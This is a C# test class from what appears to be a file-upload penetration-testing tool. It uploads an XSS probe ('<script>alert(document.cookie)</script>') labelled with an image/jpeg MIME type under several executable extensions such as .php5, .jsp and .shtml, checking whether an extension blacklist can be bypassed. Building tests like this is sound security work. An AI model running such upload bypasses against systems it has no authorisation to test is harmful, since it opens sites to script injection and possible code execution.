using System.Text;
using System.Threading.Tasks;

/*
* Test #3
* Description: This test tries to upload different kinds of files that can be used maliciously.
*/
namespace Upsploit.Tests {
    class Test03 : Test {
        public override sealed string description { get; set; }
        public override sealed string validation { get; set; }

        public Test03() {
            description = "This test uploads several files, all with the MIME type \"image/jpeg\" and different extensions. " +
              "The test uploads Test_3.xxxx where xxxx is the extension (.html, .shtml, .jsp, .asp, .phtml, .php3, .php4 and .php5)." +
              "\r\n\r\n" +
              "All the uploaded files support HTML and are uploaded with HTML content.\r\n" +
              "This test should work if the web application is blacklisting file extensions.";

            validation = "Look for Test_3.xxxx (.html, .shtml, .jsp, .asp, .phtml, .php3, .php4 and .php5) on the web application. " +
                         "If any of the files show an alert box, the test was a success and the web application is vulnerable. " +
                         "The impact can vary based on the files that are allowed. (i.e. XSS vs RCE)\r\n\r\n" +
                         "If the webpage no longer has the right extension or it doesn't render in the browser, the test failed.";
        }

        internal override async Task runTest(UploadRequest.UploadRequest request){
            //Set the data to HTML (all formats support HTML)
            const string data = "<script>alert(document.cookie)</script>";
            string[] badExtensions = {".html", ".shtml", ".jsp", ".asp", ".phtml", ".php3", ".php4", ".php5" };
            request.setFileContentType("image/jpeg"); //Default all files to image/jpeg

            request.setFileData(Encoding.ASCII.GetBytes(data));

            foreach (string t in badExtensions){
                request.setFileName("Test_3" + t);
                await request.send();
                printResult(request, "Test 03 (" + t + ")");
            }
        }
    }
}